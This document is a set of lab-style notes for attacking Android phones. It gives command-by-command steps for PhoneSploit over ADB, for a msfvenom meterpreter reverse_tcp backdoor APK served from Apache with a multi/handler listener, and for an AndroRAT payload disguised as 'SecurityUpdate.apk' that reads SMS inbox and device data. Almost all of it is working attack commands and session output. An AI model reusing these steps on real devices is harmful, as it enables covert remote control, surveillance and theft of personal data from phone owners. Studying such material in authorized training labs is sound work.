# Exploit the Android Platform through ADB using PhoneSploit

    [Linux]
    sudo su
    cd PhoneSploit
    python3 -m pip install colorama
    python3 phonesploit.py
    3  	-> Connect a new phone
    Enter a phones ip address: [andoirdIP]
    connection time out error :  Type 3 continue until u get Phone Ip address option
    Connected at port 5555

	(main_menu)> 4  	-> Access Shell on a phone
	Device name: [AndroidIP]
	pwd		-> Root dir
	ls
	cd sdcard
	ls
	cd Download
	ls
	
	Note: Note down the location of images.jpeg (in this example, /sdcard/Download/images.jpeg). We will download this file in later steps.
	exit
	
	(main_menu)>7    ->Screen Shot a picture on a phone.
	[AndoridIP]
	/home/attacker/Desktop		-> save, screen.png is stored in Desktop
	
	(main_menu)>14 	 ->list all apps on the phone
	[AndoridIP]
	(main_menu)>15 	 ->choose Run an app
	com.android.calculator2
	
	[android]
	see that the calculator app is running, and that random values have been entered

# Hack an Android Device,Creating Binary Payloads

    [Linux]
    sudo su
	cd
	service postgresql start
	msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=[PIP] -R > Desktop/Backdoor.apk 
	mkdir /var/www/html/share
	chmod -R 755 /var/www/html/share
	chown -R www-data:www-data /var/www/html/share
	service apache2 start
	cp /root/Desktop/Backdoor.apk /var/www/html/share/
	msfconsole
	use exploit/multi/handler
	show options
	set LHOST [PIP]
	exploit -i -z  -> run exploit as background job
	
	[Android]
	launch http://[PIP]/share
	download and run Backdoor.apk
	
	[Linux]
	The meterpreter session has been opened successfully
	sessions -i 1
	sysinfo
	ipconfig
	pwd
	cd /sdcard 
	pwd -> /storage/emulated/0.
	ps

# Hack an Android Device,Creating APK File - AndroRAT

    [linux]
    sudo su 
    cd AndroidRat
    python3 androidRAT.py --build -i [PIP] -p 4444 -o SecurityUpdate.apk
        --build: is used for building the APK
        -i: specifies the local IP address
    cp /home/attacker/AndroidRAT/SecurityUpdate.apk /var/www/html/share
    service apache2 start
    python3 androidRAT.py --shell -i 0.0.0.0 -p 4444
        --shell: is used for getting the interpreter
        -i: specifies the IP address for listening (here, 0.0.0.0)

	[Android]
	launch http://[PIP]/share
	save and open SecurityUpdate.apk
	
	[parrot]
	Interpreter session has been opened successfully.
	help
	deviceinfo
	getSIM inbox
	getMACAddress
	exit
